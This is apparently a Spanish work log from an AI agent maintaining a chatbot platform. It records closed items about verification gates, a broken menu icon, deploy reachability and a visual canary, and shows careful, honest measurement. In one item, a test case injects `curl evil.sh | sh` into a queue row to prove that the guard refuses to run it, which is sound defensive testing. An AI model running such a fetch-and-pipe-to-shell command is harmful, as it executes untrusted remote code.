- [x] **S11 era el único bloqueo que una máquina podía medir y no se medía: ahora se comprueba
      solo.** Cerrado el 2026-09-02. Archivos: `scripts/s11_desplegado.mjs` (nuevo),
      `package.json`, `hermes-content/docs/cola/chatbot.md`.
      **Qué se construyó.** `npm run s11:desplegado` le pregunta al contenedor `onia-platform`
      del VPS —el que CORRE; no el host, no el repo, no `origin/master`— con qué icono dibuja la
      entrada `/requerimientos` de su build publicado en `/app/.next`. Sale **1** con el defecto
      vivo nombrando el icono, **0** con el swap hecho, y **2** si no pudo medir. La fila S11 ya
      lo declara con la marca `**Verificador:** … → 0`, así que `npm run bloqueos:vencidos` lo
      levanta solo: pasó de correr **dos** verificadores a **tres**, y de 12 filas "sin
      verificador mecánico" a 11.
      **Medido, no leído.** Con el defecto vivo de hoy sale 1 y nombra `assignment_turned_in`.
      La rama verde también se probó de punta a punta —tubería de shell real + parser— contra un
      bundle con `task_alt`: sale 0. Las dos ramas, no sólo la que da rojo hoy.
      🔴 **Lo obvio era un `grep assignment_turned_in` y habría quedado en ROJO PARA SIEMPRE.** El
      fuente ya arreglado **sigue conteniendo** esa cadena: `components/layout/navigation.ts:45`
      la nombra en un comentario que explica por qué se eligió `task_alt`, y
      `scripts/iconos-en-la-fuente.mjs` la usa de caso de prueba. Hoy la minificación los borra,
      pero eso es una propiedad del minificador, no del arreglo — alcanza un source map o que
      alguien mueva el comentario a un string. Un verificador que no puede ponerse verde es peor
      que ninguno: es el mismo modo de falla que este gate existe para cerrar. Por eso mide el
      **par ruta→icono**, que es el hecho del mundo que la fila declara; un comentario no forma
      ese par. El self-check tiene ese caso, y se comprobó que la versión ingenua lo falla.
      **Dos cosas que sólo aparecieron al medir, y las dos eran bugs de este script:**
      **(1)** la primera versión tardaba **48 s** — `grep -o` con ventana ancha backtrackea sobre
      chunks minificados de megabytes (13 s con ventana 60, 27 s con 120, 48 s con 220, lineal).
      El gate que lo invoca corta a los **120 s**, y ahí un timeout se lee como "no medido": el
      verificador se volvía inútil solo con que el build creciera. Partir el bundle en `}` antes
      de filtrar lo dejó en **0,8 s** (58×), porque las entradas de menú son objetos planos.
      **(2)** la guarda de entrada, copiada de `espejo-check.mjs`, construía la URL a mano
      (`new URL("file://" + argv[1])`) y **reventaba** con `ERR_INVALID_URL` al importar el módulo
      con argumentos — o sea que importar las funciones puras rompía. Va con `pathToFileURL`.
      Antes de esa guarda, un `import` disparaba un `docker exec` contra producción como efecto de
      cargar el módulo.
      **Gates:** `npm test` completo en verde, con `test:s11-desplegado` (14 casos) cableado a la
      cadena — y verificado **en rojo primero**: `test:guards-cableados` mordió con *"estos tests
      existen y NO los corre nadie"* antes de cablearlo.

- [x] **Los bloqueos ya declaraban cómo comprobarse solos y nadie los comprobaba: ahora hay un
      gate que los corre.** Cerrado el 2026-09-02. Archivos: `scripts/bloqueos_vencidos.mjs`
      (nuevo), `package.json`, `hermes-content/docs/cola/chatbot.md`,
      `hermes-content/docs/ONIA_RADAR_DECISIONES_PRODUCTO.md`.
      **Qué se construyó.** `npm run bloqueos:vencidos` lee la tabla de "Bloqueado en Sergio",
      saca el verificador que cada fila declara y lo corre. Si sale el código que la fila declara
      como resuelto, el gate sale **1** nombrando la fila y su línea. Es el paso que faltaba: S16
      declaraba su verificador desde que se escribió y venció en silencio porque **ninguna vuelta
      lo corría**.
      **La declaración es explícita, no deducida — y eso es lo que evita el error caro.** La marca
      es `**Verificador:** \`<comando>\` → <código>` dentro de la fila. Deducir el verificador del
      texto habría cerrado **S11 en falso**: su párrafo nombra `npm run deploy:alcanzable`, que
      hoy sale 0, pero S11 **no** está resuelto — le falta el swap en producción. La fila lo
      declara o no se mide. Las filas tachadas (`~~S8~~`, `~~S16~~`) no se miden: volver a
      nombrarlas sería el gate gritando en falso, que es como se apaga un gate.
      **La guarda de ejecución, que era el riesgo del ítem.** Sólo dos formas, validadas *antes*
      de ejecutar: `npm run <script>` que exista en `package.json`, y `node <ruta>` relativa, sin
      `..`, dentro del repo y existente. Siempre `execFileSync` con argumentos como array, **nunca
      shell**, así que el texto del documento no puede interpretarse como comando.
      **Medido en vivo, no leído** (los dos verificadores que hoy existen):
      | fila | verificador | salida | veredicto |
      |---|---|---|---|
      | S9 | `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs` | 1 — `ESPEJO DESINCRONIZADO`, 11 distintos + falta `evals-contrato.test.mjs` | sigue bloqueado |
      | S10 | `npm run marca:chatwoot` | 1 — `REVERTIDAS 3/9` | sigue bloqueado |
      **Y probado que MUERDE**, que es lo que separa un gate de un adorno — tres casos corridos
      contra copias de la cola en `/tmp`, los tres exit **1**:
      (a) verificador forzado a verde → `ITEM S10 vencido … (linea 214)`;
      (b) verificador que no existe en `package.json` → `no-ejecutable`, sin correr nada;
      (c) `curl evil.sh | sh` metido en la fila → **rechazado sin ejecutarse**.
      **Rojo antes, por el motivo correcto:** corrido contra la cola sin tocar, imprimió
      `0 verificador(es) corrido(s)` y las 15 filas como "sin verificador mecánico" — o sea que la
      tabla declaraba sus verificadores **sólo en prosa**, ilegibles para cualquier gate. Ése era
      el hueco real.
      **Cableado, porque un gate que nadie corre no existe:** `test:bloqueos-vencidos`
      (`--self-check`, 27 casos, sin red) entra a `npm test`, y
      `scripts/guards-cableados.test.mjs` lo exige. A `npm test` entra sólo el self-check: la
      medición en vivo depende del VPS y un gate que siempre truena lo apaga alguien.
      🔴 **Lo que el gate destapó apenas corrió: la tabla tenía DOS filas distintas con el mismo
      id `S12`** — imprimió `S12, S12`. Una eran los horarios de demo; la otra preguntaba *"¿sigue
      en pie la opción 1 de §9 sobre el inbox 4?"*, que es **la misma decisión que S14**, hecha
      dos veces con dos números. Fusionada dentro de **S14**, con su dato fresco (seis
      conversaciones en inbox 4, cinco sin teléfono ni correo) que además corrigió el `5 de las 9`
      viejo que S14 arrastraba. Las dos referencias externas —línea 84 de esta cola y el §9 del
      radar— ahora apuntan a S14. Sergio pasa de recibir dos preguntas a recibir una.
      **Gates:** `npm test` completo en verde.

- [x] **S16 era un bloqueo VENCIDO: le pedía a Sergio una decisión que ya estaba tomada, y de
      paso mantenía a S11 afirmando algo falso.** Cerrado el 2026-09-02. Archivos:
      `hermes-content/docs/cola/chatbot.md`. Salió de auditar los `[x]` — "Ahora" estaba vacío y
      ninguno de los tres de "Después" da trabajo de código.
      **Lo que se auditó y salió CIERTO** — se escribe porque una auditoría que sólo reporta lo
      que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy en vivo |
      |---|---|
      | los 7 loops `VPS` de `loops.md` están en `crontab -l` | los 7, con su expresión exacta. Nada que rearmar |
      | S9 sigue vivo | `espejo-check.mjs` → `ESPEJO DESINCRONIZADO`, 11 distintos, y `VIAJAN JUNTOS` sigue nombrando `recepcionista.mjs → config.mjs + intents.mjs`. **Dato nuevo:** ahora además **falta** `evals-contrato.test.mjs` en el VPS |
      | S10 sigue vivo | `npm run marca:chatwoot` → `REVERTIDAS 3/9` (`BRAND_URL`, `TERMS_URL`, `PRIVACY_URL`) |
      | `campanas:vivas` sale 0 | exit **0**, `5 frases vivas, 5 con campaña` |
      | el gate de iconos quedó cableado (`d62beeb`) | `__tests__/gate-iconos-esta-cableado.test.ts` existe, y `ci` es `… && npm run gate:iconos && npm run build` — el gate **antes** del build, como dice el ítem |
      | el ítem del disco de "Después" | es de la máquina **Windows** de Sergio, no de acá: el VPS donde corre este loop va al **72 %**, con 56 GB libres y **2** worktrees de `onia-platform`, no 30. No es medible desde este carril, y el ítem ya lo decía |
      🔴 **Lo que salió FALSO, y es la clase de error que el propio loop llama "peor que un
      fantasma": el bloqueo VENCIDO.** La fila S16 pedía elegir entre (a) que el integrador
      extendiera su Paso 1 al segundo repo, (b) mergear a mano, o (c) dejarlo. **Ya habían pasado
      (a) y (b), hacía media hora**, y la cola seguía preguntando. Medido con `git fetch` fresco y
      `merge-base --is-ancestor`, no leído:
      - el integrador arregló su Paso 1 en `d26444c1` de `onia-hermes` (*"contaba las ramas contra
        el repo equivocado y tres arreglos visibles quedaron varados"*), ya en `origin/main`;
      - mergeó el carril a `master` de `onia-platform` en `503af44` (12:38 UTC);
      - **los cuatro** commits que la cola declara (`22fd088`, `675541b`, `d62beeb`, `e644c85`)
        llegan a `origin/master`, y `npm run deploy:alcanzable` pasó de **1** a **0**;
      - el radar §23 ya figuraba **RESUELTO — Sergio NO decide nada**. La cola de este carril era
        el único lugar donde la decisión seguía abierta.
      **El daño real no era S16 sino su vecina.** S11 abría con *"commiteado y pusheado, pero NO
      llega a `master`: ver S16"* — con el commit ya en `master`. Esa frase es exactamente la que
      le dice a Sergio que dar el OK del deploy no sirve de nada. Un bloqueo vencido no se queda
      quieto: le presta su motivo falso al de al lado.
      **Y S11 NO se cierra, porque el defecto sigue vivo en producción** — verificado contra el
      sistema correcto, no contra el repo: el contenedor `onia-platform` lleva **15 h** arriba
      (anterior al merge de las 12:38) y su build publicado todavía contiene
      `assignment_turned_in` (`docker exec … grep -rl` sobre `/app/.next`). Lo que cambia es el
      motivo: antes el deploy no podía arreglarlo, ahora **sí**. Falta sólo el swap, que es de él.
      **Lo que queda abierto, y es el ítem de "Ahora":** los tres bloqueos con verificador
      mecánico (S9, S10, S16) declaran cómo se comprueban solos, y **ninguna vuelta los corre como
      paso propio**. S16 se destapó de casualidad. Mientras eso no sea un gate, el próximo bloqueo
      que venza lo encuentra el azar otra vez.

- [x] **El gate que impide que un icono vuelva a salir como palabra en el menú EXISTÍA y no lo
      corría nadie.** Cerrado el 2026-09-02 (commit `d62beeb` de `onia-platform`, rama
      `claude/chatbots-platform-review-0d1d09`). Archivos:
      `__tests__/gate-iconos-esta-cableado.test.ts` (nuevo) y `package.json`.
      Salió de auditar los `[x]`, que es lo que manda el loop cuando "Ahora" queda sin ítems
      desbloqueados — los tres de "Después" siguen frenados por algo que no es código.
      **Lo que se auditó y salió CIERTO** — se escribe porque una auditoría que sólo reporta lo
      que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy en vivo |
      |---|---|
      | los 7 loops `VPS` de `loops.md` están en `crontab -l` | los 7, con su expresión exacta. Nada que rearmar |
      | `S16` sigue vivo | `npm run deploy:alcanzable` → exit **1**, `22fd088` y `675541b` `no-llega`; `e644c85` sigue saliendo `ok` |
      | `npm run gate:iconos` da verde | exit **0**, `35 iconos del menu, los 35 dibujan glifo` |
      | suite del bot verde | `npm run test:bot` → **697 pass, 0 fail** |
      | `npm run campanas:vivas` sale 0 | exit **0**, `5 frases vivas, 5 con campaña` |
      | los npm scripts que la cola nombra existen | 6 de 6 en su repo (`gate:iconos` es de `onia-platform`, no de acá) |
      | las 22 rutas de `onia-platform` que la cola declara existen | 22 de 22 — incluido que `scripts/iconos-en-la-fuente.test.ts` **siga sin existir**, que es lo que la cola dice |
      🔴 **Lo que salió FALSO, y es de la clase cara: literalmente cierto, funcionalmente falso.**
      El ítem de acá abajo dice *"el gate que S11 daba por hecho ahora existe de verdad"*. Existe.
      **Y no lo invocaba nadie.** Medido, no supuesto: `gate:iconos` no estaba en `npm test`
      (es un `.mjs`, vitest no lo ve), ni en la cadena `npm run ci`, ni en
      `.github/workflows/ci.yml`, ni en `build`. Su única mención en todo el repo fuera del
      propio script era un comentario en `components/layout/navigation.ts:47`.
      **La consecuencia:** el agujero que ese ítem declaraba tapado seguía abierto entero. Se
      agrega un icono al menú → `scripts/subset-iconos.mjs` se rinde en silencio y sale 0 si
      falta `pyftsubset` → la fuente publicada no trae el glifo → el nombre crudo vuelve al
      sidebar de **toda** pantalla del dashboard, `/inbox` incluida, y nada se pone rojo. Es
      exactamente el camino por el que se coló `ASSIGNMENT_TURNED_IN` la primera vez.
      El vecino `__tests__/eslint-no-lintea-worktrees.test.ts` ya lo tenía escrito en una línea:
      *"Un gate que nadie corre no existe"*. Estaba en el repo y no se aplicó al gate siguiente.
      **Lo que se hizo:** `gate:iconos` entra a la cadena `ci`, **antes del `build`**. Antes y no
      después porque el gate mide la fuente **commiteada** —la que se publica cuando el subset
      falla mudo—; medirla después sería medir la regenerada, justo la que el entorno roto no
      produce. Y falla en 2 s en vez de después de un `next build` entero.
      **Y su guardia, que es el punto:** el test nuevo vigila el **cableado**, no los iconos, y
      por eso no necesita navegador — vive en `npm test`, que **sí** corre GitHub Actions, así
      que sacar el gate de la cadena pone el CI en rojo.
      ⚠️ **Lo que este ítem NO logra, dicho antes de que alguien lo asuma:** GitHub Actions
      **no** renderiza los 35 iconos. `ci.yml` no instala navegadores (no tiene
      `playwright install`), así que el renderizado real sigue ocurriendo sólo donde hay
      Chromium: `npm run ci` en local y en el VPS. Cablearlo en Actions es agregar un paso de
      instalación de navegador que desde este loop **no se puede verificar corriendo**, y un
      paso de CI que rompe para todos es peor que el hueco que tapa. Anotado, no hecho.
      **Probado que muerde, no sólo que pasa:** **2 rojos** antes por el motivo correcto. El
      segundo caso hizo falta corregirlo: pasaba en **verde** con el gate AUSENTE, porque
      `indexOf` de un string que no está da `-1` y `-1` es menor que cualquier índice — o sea
      que el caso "corre antes del build" daba verde justo cuando fallaba lo que mide. Los dos
      `toBeGreaterThan(-1)` no son adorno.
      **Gates:** `tsc --noEmit` limpio · **2444** tests verdes (198 archivos, +3 nuevos sobre
      los 2441 anotados) · `eslint` 0 en el archivo tocado.
      ⚠️ **Commiteado, NO mergeado.** `d62beeb` es el **tercer** commit de este carril que no
      llega a `origin/master` — se suma a **S16**, no a S11: no necesita un deploy al VPS (es un
      `package.json` y un test), necesita estar en `master` para que el CI de `master` lo corra.

- [x] **Los dos arreglos de este carril al producto estaban pusheados y a nadie le llegaban: el
      deploy buildea `master` y no están en `master`.** Cerrado el 2026-09-02. Archivos:
      `scripts/deploy_alcanzable.mjs` (nuevo) y `package.json`. Salió de auditar los `[x]`, que
      es lo que manda el loop cuando "Ahora" queda sin ítems desbloqueados.
      🔴 **Gate 1 primero, y acá salvó la vuelta dos veces.** (1) El primer hallazgo aparente fue
      que 5 de las 10 pantallas del canario no tenían baseline. **Falso:** existen en `main` — era
      **esta rama la que estaba 14 commits atrás**. Se hizo `merge --ff-only origin/main` antes de
      seguir, porque además `scripts/verificar_cola.js` había cambiado en `main` (`dc8baa8b`) y el
      gate se estaba corriendo con una versión vieja. (2) Con el árbol al día, el gate de la cola
      sigue diciendo `cola-vacia` **exit 1**, que es la verdad: "Ahora" está vacío.
      **Lo que se auditó y salió CIERTO** — se escribe porque una auditoría que sólo reporta lo
      que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy en vivo |
      |---|---|
      | el canario reporta `panel-chatbot` como `NO MEDIDA` nombrando las dos variables | corrido en vivo: `NO MEDIDA :: faltan ONIA_CANARIO_USER / ONIA_CANARIO_PASS`. Y su baseline sigue en `bytes: 0` |
      | `--self-check` cuenta 65 casos sobre 10 pantallas | `self-check: ok — 65 casos sobre 10 pantallas`, exit 0 |
      | el login del chat pesa 3,58 MB y su baseline dejó de estar anclada en 12,9 MB | corrido en vivo: **3499 KB / 868 ms**, contra una baseline de 3.583.426 B. Coinciden: la baseline es honesta |
      | la evidencia del ítem existe | `hermes-content/docs/historial/canario-visual/2026-09-01-login-chat.png`, 22.552 B |
      | los commits `22fd088` y `675541b` existen y están pusheados | sí, los dos en `origin/claude/chatbots-platform-review-0d1d09` de `onia-platform` |
      🔴 **Lo que salió FALSO, y es lo que esta vuelta arregla.** "Pusheado" no es "alcanzable".
      `onia-platform` se despliega buildeando `origin/master` (§20 del radar lo midió:
      producción corre `8a3b5a6`), y los dos commits **no están en `master`** — viven en la rama
      del carril, 2 adelante y 17 atrás, que nadie mergea. Con el OK de Sergio dado, el swap
      buildea `master`, el icono sigue roto y **S11** se cierra en falso. **Es la tercera vez que
      esa misma fila se queda corta**: primero el commit no existía, después existía sin estar
      mergeado, ahora no llega. Las tres veces la lista la mantenía un párrafo a mano.
      **Causa, medida y no supuesta:** el integrador tiene el merge a `master` pre-autorizado,
      pero su Paso 1 hace `cd /root/loops/onia-hermes` y cuenta la rama contra el `main` de **ese**
      repo, donde da 0. El mismo nombre de rama existe en los dos repos y el que tiene trabajo sin
      mergear es el que nadie enumera. Es procedimiento del carril de integración ⇒ **S16** + radar
      §23, con las tres opciones cotizadas.
      **Lo que se hizo, para que no lo mantenga un párrafo:** `npm run deploy:alcanzable` saca los
      commits de `onia-platform` que la cola declara —exigiendo el `de \`onia-platform\``, porque
      la cola nombra también commits del bot y de `onia-hermes`— y le pregunta a git si
      `origin/master` los alcanza. Distingue los **dos** modos de falla ya pagados: `no-existe` y
      `no-llega`. Corrido: **exit 1** nombrando `22fd088` y `675541b`, y `e644c85` (de un ítem
      viejo) sale **OK** — ésa es la prueba de que discrimina en vez de gritar a todo.
      **Probado que los tests MUERDEN, no sólo que pasan:** aflojando el discriminador de repo →
      **2 rojos**; apagando `juzgar()` → **2 rojos** más el que exige que el motivo diga en qué
      línea corregir; apagando la deduplicación por sha → **1 rojo**. `--self-check` cuenta sus
      casos en vez de hardcodearlos (13), por la misma razón que el canario: un conteo que miente
      es la primera grieta de un gate.
      **Cableado como el resto del repo:** la medición en vivo es su propio script
      (`deploy:alcanzable`) y **no** entra a `npm test` —igual que `marca:chatwoot` y
      `campanas:vivas`, que también están rojos esperando un `scp`—; lo que entra a `npm test` es
      el `--self-check` (`test:deploy-alcanzable`). Un gate que siempre truena lo apaga alguien.
      ⚠️ **No mergea ni despliega nada.** `master` es rama protegida de este loop y hay un hook
      `pre-push` que lo bloquea.

- [x] **El menú del producto mostraba `ASSIGNMENT_TURNED_IN` en letras gigantes, y el bloqueo
      que decía tenerlo arreglado apuntaba a un commit inexistente.** Cerrado el 2026-09-02
      (commit `22fd088` de `onia-platform`, rama `claude/chatbots-platform-review-0d1d09`).
      **Commiteado, NO desplegado** — el deploy es de Sergio y sigue como **S11**.
      Salió de la auditoría de los `[x]`, que es lo que manda el loop cuando "Ahora" queda sin
      ítems desbloqueados (los tres de "Después" están frenados por algo que no es código).
      **Lo que se auditó y salió CIERTO** — se escribe porque una auditoría que sólo reporta lo
      que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy |
      |---|---|
      | suite del bot verde | `npm run test:bot` → **697 pass, 0 fail** (creció desde los 684 anotados; ninguno rojo) |
      | `npm run campanas:vivas` sale 0, 5 de 5 cubiertas | exit **0**, `5 frases vivas, 5 con campaña` |
      | S10 sigue vivo: `REVERTIDAS 3/9` | `npm run marca:chatwoot` → exit **1**, las mismas tres (`BRAND_URL`, `TERMS_URL`, `PRIVACY_URL`) |
      | S9 sigue vivo y el gate nombra los acoples | `espejo-check.mjs` → exit **1**, y `VIAJAN JUNTOS` imprime `recepcionista.mjs` → `config.mjs` + `intents.mjs` |
      | los 15 archivos que la cola declara del producto existen | **14 de 15** existen; el que falta es el que destapó todo |
      **El que falló: `scripts/iconos-en-la-fuente.test.ts`**, que **S11** daba por escrito. No
      existe — y tirando del hilo, tampoco existe el commit `4f86381` ni la rama
      `carril/chatbot-v68-friccion` que S11 mandaba desplegar: `git fetch --all --prune` contra
      GitHub y ninguna de las 39 ramas remotas matchea. Ese trabajo se hizo en Windows y nunca
      se pusheó. **La fila S11 le pedía a Sergio desplegar la nada**, y por eso no se destrababa.
      **El defecto seguía vivo, y se comprobó MIRANDO, no con grep:** renderizado el `.woff2` que
      se publica, `assignment_turned_in` mide **20em** (el texto crudo) contra **1em** de los
      otros 34 iconos del menú. Los 35 se midieron: es el **único** roto.
      **Por qué se coló, que es el hallazgo que sobrevive al ítem.** Dos guardas que parecían
      cubrirlo y no lo cubrían: el icono entró el 30-ago (`ab9e0de`) y la fuente subseteada es
      del 29-ago (`917adca`), pero `scripts/subset-iconos.mjs` —que corre **dentro del `build`**—
      **se rinde en silencio y sale 0** cuando falta `pyftsubset` (reproducido en este VPS), así
      que el build publica la fuente vieja sin decir una palabra; y `e2e/iconos.spec.ts` sólo
      mira `/`, `/login` y `/register`, y el sidebar exige sesión.
      **Lo que se hizo.** El ítem usa `task_alt`, que ya está en el subset y significa lo mismo:
      así el arreglo **no depende de que exista Python en el entorno de build**, que es justo lo
      que falló. Regenerar la fuente habría necesitado `pyftsubset`, que no está en el VPS y no
      se instaló a propósito. Y el gate que S11 daba por hecho ahora existe de verdad:
      `npm run gate:iconos` (`scripts/iconos-en-la-fuente.mjs`) renderiza los 35 iconos que el
      menú declara contra la fuente publicada, **sin sesión ni app levantada** — por eso es
      corrible desde este loop, y por eso cubre el hueco que S15 (la credencial del canario)
      deja abierto. **Probado que muerde:** rojo antes por el motivo correcto
      (`assignment_turned_in — 20em`), verde después (`35 iconos, los 35 dibujan glifo`).
      Los **5 snapshots** del pack por rubro se movieron solos con el icono; revisado que la
      única diferencia del diff fuera `icon` antes de actualizarlos.
      **Gates:** `tsc --noEmit` limpio · **2441** tests verdes (197 archivos) · `eslint` 0
      errores y 0 warnings en los archivos tocados.
      🔴 **Corregido el 2026-09-02 (vuelta siguiente, auditando este mismo `[x]`): la frase
      "el gate que S11 daba por hecho ahora existe de verdad" era cierta y no alcanzaba.**
      El gate existía y **no lo corría nadie** — ni `npm test`, ni `npm run ci`, ni `ci.yml`, ni
      `build` — así que el agujero que este ítem declara tapado siguió abierto hasta que se
      cableó. El ítem NO se desmarca porque el trabajo se hizo y el icono está arreglado; lo
      que estaba mal era la conclusión. **Construir un gate y cablearlo son dos cosas**, y esta
      cola ya paga esa distinción en otra parte (S9: "commitear una mejora no la enciende").
      Cerrado arriba, en el primer ítem de esta sección.

- [x] **Saber QUÉ archivos difieren no alcanzaba para desplegar bien: el gate ahora dice cuáles
      VIAJAN JUNTOS.** Cerrado el 2026-09-02. Archivos: `hermes-content/deploy/vps-ops/bot/espejo-check.mjs`
      y su `.test.mjs`. Salió de auditar los `[x]` — "Ahora" estaba vacío y los tres de "Después"
      siguen frenados por algo que no es código (el disco es de la máquina Windows de Sergio y el
      ítem dice que no lo arregla este carril; la data QA es "no borrar todavía"; el QR espera el
      banco, **S2**).
      **Lo que se auditó y salió CIERTO** — se escribe porque una auditoría que sólo reporta lo
      que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy en vivo |
      |---|---|
      | `Onia (interna)` → inbox 5 (el comando que el ítem del 01-sep dejó escrito) | la base de producción da **5**. `ZZ QA Clinica Chatbot` → 7, las otras dos en NULL. El revert silencioso **no** volvió |
      | inbox 4 = 6 desconocidos, dos del 01-sep | **exactamente esos seis** (34, 36, 38, 40, 45, 46). Ninguno nuevo desde el 01-sep; la conv 10 es "Visitante Prueba Web" con 0 mensajes |
      | S10 sigue vivo, no vencido | `npm run marca:chatwoot` → exit **1**, `REVERTIDAS 3/9` (`BRAND_URL`, `TERMS_URL`, `PRIVACY_URL`). Sin cambio |
      | `campanas:vivas` en 0 | exit **0**, 5 frases vivas / 5 con campaña |
      | suite del bot verde | **690/690** antes de tocar nada (la cola decía 684: creció, no se rompió) |
      | commit `675541b` de `onia-platform` existe con lo que dice | sí: 6 archivos, `vocabulario.ts` + `ChatbotClient.tsx` + los dos tests. Sigue **commiteado, NO desplegado** |
      🔴 **Lo que salió FALSO, y es lo que esta vuelta arregla: S9 estaba corto otra vez.** El
      detalle y la lista corregida están en su fila; el resumen es que el espejo sumó la feature
      del link de agenda en **cinco** archivos y S9 nombraba dos, con un acople duro
      (`intents.wantsToBook` y `R_AGENDA` no existen en el VPS). **Es la tercera vez que la misma
      instrucción se queda corta** — antes fue el dato sin el código que lo lee, después el
      esquema que rechazaba la clave nueva. Las tres veces la lista la mantenía un párrafo a mano.
      **Por eso el arreglo no es corregir el párrafo otra vez, sino que lo diga el gate:**
      `espejo-check.mjs` calcula los acoples en vivo (`simbolosUsados`, `simbolosDefinidos`,
      `acoplesDeCopia`) y ahora imprime `VIAJAN JUNTOS (copiar uno solo deja el motor llamando a
      lo que no existe): recepcionista.mjs NO viaja solo: necesita config.mjs (config.R_AGENDA),
      intents.mjs (intents.wantsToBook)`. Es análisis estático a propósito: importar los módulos
      del VPS ejecutaría su motor dentro de un gate de sólo lectura.
      **Trampas que costaron una corrección cada una, y quedan con su caso:** (1) sin exigir el
      paréntesis, `"./intents.mjs"` del import colaba un símbolo fantasma; (2) `recepcionista.mjs`
      **no importa `say`**, lo recibe inyectado desde `bot-engine`
      (`const { finalize, handoffResult, say } = motor;`) — buscar sólo el import daba un falso
      **negativo**, que en un gate es peor que el falso positivo porque calla justo donde hay que
      avisar; (3) el propio `espejo-check.mjs` y los `.test.mjs` se auto-denunciaban por citar
      `R_AGENDA` y `wantsToBook` en comentarios y fixtures: quedan afuera del análisis por ser
      herramienta y no motor.
      **Probado que los tests MUERDEN:** aflojando el paréntesis del regex → **3 rojos**, uno de
      ellos el guardia de que el espejo real es coherente consigo mismo (si ese fallara, el roto
      sería el espejo). Suite del bot **697/697** verde (690 antes). El gate sigue en exit 1 y
      ahora nombra **una** línea de acople, la real.
      ⚠️ **No despliega nada.** El `scp` sigue siendo de Sergio y sigue siendo **S9**; lo que
      cambió es que la lista de qué copiar ya no la mantiene un párrafo que envejece.

- [x] **El canario daba por buena la pantalla del panel del chatbot sin haberla visto nunca:
      medía el LOGIN y lo reportaba como "sin disparo mecánico".** Cerrado el 2026-09-02.
      Archivos: `scripts/canario_visual.mjs` y
      `hermes-content/references/canario-visual/panel-chatbot/baseline.json`.
      🔴 **Gate 1 corrigió el ítem, y hacia peor.** El ítem afirmaba *"el canario la reporta
      **no medida** — nunca OK"*. **Falso, y medido, no leído:** corrido en vivo antes de tocar
      nada, imprimía `panel-chatbot status=200 702 KB 148 ms sin disparo mecanico
      (comparada)`. La palabra `comparada` es literal — comparó contra una baseline. El
      `NOTA: NO MEDIDA` que el ítem citaba como salvaguarda era **una cadena de texto en el
      JSON que el script nunca lee**: un comentario para un humano que ningún humano abre.
      O sea que la pantalla no salía "no medida": salía **verde**.
      **Y la baseline estaba envenenada, que es la mitad que nadie había visto.** Guardaba
      `bytes: 773831` y `msMirable: 973` — los del **login**— bajo el nombre del panel. Efecto
      doble: hoy el login se compara contra sí mismo y da verde eterno; y el día que la sesión
      funcione, el panel real dispara un **fantasma de peso** contra números de otra pantalla.
      Es el mismo defecto que se cerró ayer en `login-chat` (baseline anclada 3,6× arriba de la
      realidad): **verde con cara de éxito, dentro del vigilante mismo**, por segundo día
      seguido.
      **Lo que se hizo:** `llegoALaPantalla(urlPedida, urlFinal)` compara host + camino
      (el query string y la barra final no son desvíos) y `medir()` marca `medida: false`
      cuando la página que quedó abierta no es la que se pidió. `juzgar()` corta ahí y
      devuelve un **tercer veredicto**, `NO MEDIDA`, que no es ítem ni "sin disparo":
      no es ítem **a propósito** —gritaría en cada vuelta hasta que alguien apague el canario,
      que es la trampa que el propio script documenta en `espejo-check`— y sobre todo **no
      compara contra la baseline**, que es lo que mataba el fantasma de peso.
      La línea impresa ahora dice `NO MEDIDA :: <motivo> — la captura es de OTRA pantalla, no
      la mires como si fuera esta`.
      **Circuito de sesión hasta el borde (regla 2 del carril):** `requiereSesion: true` es un
      campo de la lista, y `iniciarSesion()` entra por el formulario real de `/login`. Con
      `ONIA_CANARIO_USER` / `ONIA_CANARIO_PASS` puestos, el canario entra y mide el panel de
      verdad; sin ellos degrada a `NO MEDIDA` nombrando **exactamente** las dos variables que
      faltan. **Enchufarlas es un `env`, no un cambio de código** — es todo lo que queda, y es
      **S15**.
      **Trampa que casi introduzco y quedó cubierta con su caso:** el primer corte era
      `medida = !fallo && llegoALaPantalla(...)`, que degradaba a `NO MEDIDA` una pantalla
      **caída** — o sea que una caída real de producción salía como veredicto tibio en vez de
      ítem. Ahora `medida` es `null` cuando hay `fallo`, y hay un caso que lo fija.
      **Probado que los tests MUERDEN:** apagando el corte de `juzgar()` → **3 casos rojos**;
      apagando la detección de desvío (`return true`) → **3 casos rojos**; restaurado, verde.
      El `--self-check` pasó de 13 casos escritos a mano a **65 contados por el propio
      script** (un conteo hardcodeado ya había dejado de coincidir con la realidad).
      **Verificado en vivo, no en frío**, y con dos pantallas sanas al lado para medir el radio:
      ```
      home              200  2859 KB  216 ms  sin disparo mecanico (comparada)
      login-plataforma  200   699 KB  123 ms  sin disparo mecanico (comparada)
      panel-chatbot     200   702 KB  133 ms  NO MEDIDA :: faltan ONIA_CANARIO_USER / ...
      ```
      Las otras **nueve** pantallas no se movieron: comprobado antes de tocar nada que
      `panel-chatbot` es la **única** cuya baseline tiene `urlFinal ≠ url`.
      **MIRADA la captura** (`/tmp/canario-post/panel-chatbot.png`): es el login de
      `app.onia.com.bo` — logo, los dos campos, "Iniciar sesión" — con los cuatro iconos
      (`bolt`, `credit_card_off`, `smart_toy`, `person_add`) dibujados como glifos y **no**
      como palabras. La baseline se reemplazó por un registro con los números en **0**, para
      que ni leída por accidente pueda producir una comparación falsa.

- [x] **El login del chat NO pesa 12,9 MB: pesa 3,58 MB, y los 12,9 eran el mismo contenido
      SIN COMPRIMIR.** Cerrado el 2026-09-02. Lo que cambió en el repo:
      `hermes-content/references/canario-visual/login-chat/baseline.json`.
      **Gate 1 primero, y acá salvó la vuelta:** el ítem pedía "ver qué assets entran antes de
      decidir si se puede partir o si es el precio de Chatwoot", así que lo primero fue medir de
      nuevo en vez de heredar el número. Da **3.583.426 bytes** y 808-913 ms — no 12.953.799 ni
      2.437 ms. Corrido **tres veces seguidas con el propio canario**: 3499 KB clavado las tres.
      **De dónde salían los 12,9 MB, medido y no supuesto:** se bajó cada asset del login con
      `Accept-Encoding: identity` y se sumaron uno por uno → **12.973.552 bytes**, que está a
      **0,15 %** del número viejo. O sea que los 12,9 MB son los bytes *decodificados* de estos
      mismos assets, no assets de más. Por el cable viajan 3,58 MB gzip. La conclusión del ítem
      —"es el bundle de Chatwoot servido entero en la ruta de login"— era **correcta**; el que
      estaba mal era el tamaño, por un factor de 3,6.
